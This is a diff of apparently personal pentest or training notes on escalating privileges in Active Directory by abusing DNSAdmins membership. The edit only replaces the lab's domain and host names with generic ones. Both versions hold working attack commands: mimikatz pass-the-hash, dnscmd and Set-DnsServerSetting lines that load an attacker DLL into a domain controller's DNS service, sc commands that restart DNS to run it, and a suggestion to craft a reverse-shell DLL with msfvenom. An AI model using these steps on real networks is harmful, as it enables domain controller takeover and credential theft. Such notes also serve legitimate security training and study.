@@ -10,24 +10,24 @@ Get-NetGroupMember -GroupName "DNSAdmins"
 
 -in this case srvadmin is part of the DNSAdmins group, passing the hash to get his privs:
 
-sekurlsa::pth /User:srvadmin /ntlm:hash /domain:dollarcorp.moneycorp.local /run:powershell.exe
+sekurlsa::pth /User:srvadmin /ntlm:hash /domain:subdomain.domain.local /run:powershell.exe
 
 -From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSTA DNS):
 
-dnscmd dcorp-dc /config /serverlevelplugindll \\localip\dll\mimilib.dll
+dnscmd subdomain-dc /config /serverlevelplugindll \\localip\dll\mimilib.dll
 
 you can craft a malicious reverse shell dll with msfvenom
 
 *--Using DNSServer module (needs RSAT DNS):
-	$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All
+	$dnsettings = Get-DnsServerSetting -ComputerName subdomain-dc -Verbose -All
 	$dnsettings.ServerLevelPluginDll - "\\localip\dll\mimilib.dll"
-	Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose
+	Set-DnsServerSetting -InputObject $dnsettings -ComputerName subdomain-dc -Verbose
 
 *MAKE THE DLL DIRECTORY READABLE AND WRITABLE BY EVERYONE! (USE THE GUI)
 
 -Restart the DNS service (assuming that the DNSAdmins group has the permission to do so):
 cmd
-sc \\dcorp-dc stop dns
-sc \\dcorp-dc start dns
+sc \\subdomain-dc stop dns
+sc \\subdomain-dc start dns
 
 *By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log
